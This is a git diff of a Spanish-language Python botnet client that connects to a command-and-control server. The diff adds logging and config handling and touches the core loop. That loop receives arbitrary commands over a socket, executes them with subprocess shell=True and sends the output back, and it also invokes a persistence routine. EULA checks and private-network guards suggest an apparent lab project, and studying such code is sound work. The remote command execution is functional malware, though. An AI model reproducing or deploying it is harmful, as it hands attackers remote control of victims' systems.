@@ -7,7 +7,76 @@ import requests
 import argparse
 import re
 import sys
+import logging
+import configparser
+import traceback
 
+BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
+parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
+parser.add_argument("--host", required=True, help="IP del servidor C&C")
+parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
+parser.add_argument("--key", required=True, help="Clave de autenticación")
+args = parser.parse_args()
+
+# Configurar logging
+def configurar_logging():
+    """
+    Configura el sistema de logging para el cliente infectado.
+
+    La configuración se lee desde el archivo "config.ini" en la carpeta "config"
+    en el directorio raíz del proyecto. Si no se encuentra el archivo, se muestra
+    un mensaje de error y se sale del programa.
+
+    La ruta del archivo de log se establece en el directorio "logs" en el
+    directorio raíz del proyecto. Si no existe, se crea.
+
+    El nivel de log se establece según la clave "LOG_LEVEL" en el objeto de
+    configuración. El nivel de log puede ser "DEBUG", "INFO", "WARNING", "ERROR"
+    o "CRITICAL". Si no se especifica un nivel de log, se establece en "INFO"
+    por defecto.
+
+    Los mensajes de log se escriben en el archivo de log y en la consola.
+    """
+
+    config_path = os.path.join(BASE_DIR, "config", "config.ini")
+    if not os.path.exists(config_path):
+        print("[ERROR] No se encontró config.ini en la carpeta config/")
+        sys.exit(1)
+
+    config = configparser.ConfigParser()
+    config.read(config_path)
+
+    # Ruta absoluta para el directorio de logs en el directorio raíz del proyecto
+    log_dir = os.path.join(BASE_DIR, config.get("LOGGING", "LOG_DIR", fallback="logs"))
+    log_file = config.get("LOGGING", "CLIENT_LOG_FILE", fallback="client.log")
+
+    # Asegurar que la carpeta logs exista en el directorio raíz del proyecto
+    os.makedirs(log_dir, exist_ok=True)
+
+    log_path = os.path.join(log_dir, log_file)
+
+    log_level = config.get("LOGGING", "LOG_LEVEL", fallback="INFO").upper()
+    log_levels = {
+        "DEBUG": logging.DEBUG,
+        "INFO": logging.INFO,
+        "WARNING": logging.WARNING,
+        "ERROR": logging.ERROR,
+        "CRITICAL": logging.CRITICAL
+    }
+
+    logging.basicConfig(
+        level=log_levels.get(log_level, logging.INFO),
+        format="%(asctime)s - %(levelname)s - %(message)s",
+        handlers=[
+            logging.FileHandler(log_path, encoding="utf-8"),  # Guardar en archivo
+            logging.StreamHandler()  # Mostrar en pantalla
+        ]
+    )
+
+    logging.info(f"Logging configurado correctamente en {log_path}")
+
+# Llamar a la función de configuración de logging al inicio del script
+configurar_logging()
 
 def validar_ip(ip):
     
@@ -43,14 +112,6 @@ def validar_puerto(port):
     """
 
     return 1 <= port <= 65535
-
-parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
-parser.add_argument("--host", required=True, help="IP del servidor C&C")
-parser.add_argument("--port", type=int, required=True, help="Puerto del servidor C&C")
-parser.add_argument("--key", required=True, help="Clave de autenticación")
-args = parser.parse_args()
-
-
 
 def esEntornoCloud():
     
@@ -107,7 +168,9 @@ def verificar_eula(tipo):
     if tipo not in ["servidor", "cliente"]:
         raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")
 
-    eula_path = f"eula_{tipo}.txt"
+    # Ruta para el archivo EULA en la carpeta docs
+    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+    eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")
 
     # Si no existe, lo crea
     if not os.path.exists(eula_path):
@@ -159,21 +222,14 @@ def detectar_sistema():
     return platform.system().lower()  # "windows" o "linux"
 
 def conectar_a_CnC():
-    
-    """
-    Establece una conexión del bot al servidor de Comando y Control (C&C).
-
-    Crea un socket TCP/IP y se conecta al servidor C&C usando la dirección
-    y puerto especificados por las variables HOST y PORT. Devuelve el socket
-    conectado para permitir la comunicación con el servidor.
-
-    :return: El socket conectado al servidor C&C.
-    """
-
-    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    bot.connect((HOST, PORT))
-    print(f"Conectado al servidor C&C {HOST}:{PORT}")
-    return bot
+    try:
+        bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        bot.connect((HOST, PORT))
+        logging.info(f"Conectado al servidor C&C {HOST}:{PORT}")
+        return bot
+    except Exception as e:
+        logging.error(f"Error al conectar con el C&C: {traceback.format_exc()}")
+        sys.exit(1)
 
 def intentar_persistencia():
 
@@ -251,27 +307,13 @@ def intentar_persistencia():
     return mensaje_final
 
 def esperar_ordenes(bot):
-    
-    """
-    Espera órdenes del servidor C&C y las ejecuta.
-
-    Este bucle infinito espera recibir órdenes del servidor C&C y las
-    ejecuta en el sistema operativo del bot. Si el comando es "detect_os",
-    devuelve el resultado de detectar_sistema(). Si el comando es "persistencia",
-    intenta establecer persistencia en el sistema y devuelve el resultado.
-    Para cualquier otro comando, lo ejecuta en el sistema y devuelve la
-    salida del comando o un mensaje de error si ocurre un error.
-
-    :param bot: El socket conectado al servidor C&C.
-    :type bot: socket.socket
-    """
     while True:
         try:
             orden = bot.recv(1024).decode('utf-8', errors='ignore').strip()
             if not orden:
                 continue
             
-            print(f"Comando recibido: {orden}")
+            logging.info(f"Comando recibido: {orden}")
 
             if orden == "detect_os":
                 bot.send(detectar_sistema().encode("utf-8"))
@@ -284,29 +326,17 @@ def esperar_ordenes(bot):
             bot.send(resultado if resultado else b"Comando ejecutado sin salida")
 
         except Exception as e:
-            print(f"Error: {e}")
+            logging.error(f"Error en la comunicación con el servidor: {traceback.format_exc()}")
             break
 
 def ejecutar_comando(orden):
-    
-    """
-    Ejecuta un comando del sistema operativo recibido como cadena.
-
-    Usa subprocess para ejecutar el comando proporcionado y captura su salida.
-    Si el comando se ejecuta correctamente, devuelve la salida. Si ocurre un 
-    error durante la ejecución, captura la salida de error y la devuelve 
-    como mensaje de error.
-
-    :param orden: Comando del sistema a ejecutar.
-    :return: Salida del comando o mensaje de error en caso de fallo.
-    """
-
     try:
-        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT) # Ejecutar el comando
+        resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT)
         return resultado
     except subprocess.CalledProcessError as e:
-        return f"Error al ejecutar el comando: {e.output.decode('utf-8', errors='ignore')}".encode('utf-8') # Devolver el error
-
+        logging.error(f"Error al ejecutar el comando '{orden}': {traceback.format_exc()}")
+        return f"Error: {e.output.decode()}".encode('utf-8')
+    
 def ejecutar_bot():
     
     """
@@ -324,20 +354,26 @@ def ejecutar_bot():
 
 if __name__ == "__main__":
     if not validar_ip(args.host):
-        print("[ERROR] IP no válida.")
+        logging.error("[ERROR] IP no válida.")
         sys.exit(1)
+        
     if not validar_puerto(args.port):
-        print("[ERROR] Puerto fuera de rango (1-65535).")
+        logging.error("[ERROR] Puerto fuera de rango (1-65535).")
         sys.exit(1)
+        
     verificar_eula("cliente")
     HOST = args.host
     PORT = args.port
-    print(f"Conectando a {HOST}:{PORT} con autenticación segura...")
+
+    logging.info(f"Conectando a {HOST}:{PORT} con autenticación segura...")
+
     if esEntornoCloud():
-        print("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
-        exit()
+        logging.error("[ERROR] No puedes ejecutar este programa en un servidor cloud.")
+        sys.exit(1)
     if not es_red_privada(HOST):
-        print("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
-        exit()
+        logging.error("[ERROR] No puedes ejecutar este servidor fuera de una red privada.")
+        sys.exit(1)
+
     SECRET_KEY = args.key
-    ejecutar_bot()
+    bot = conectar_a_CnC()
+    esperar_ordenes(bot)
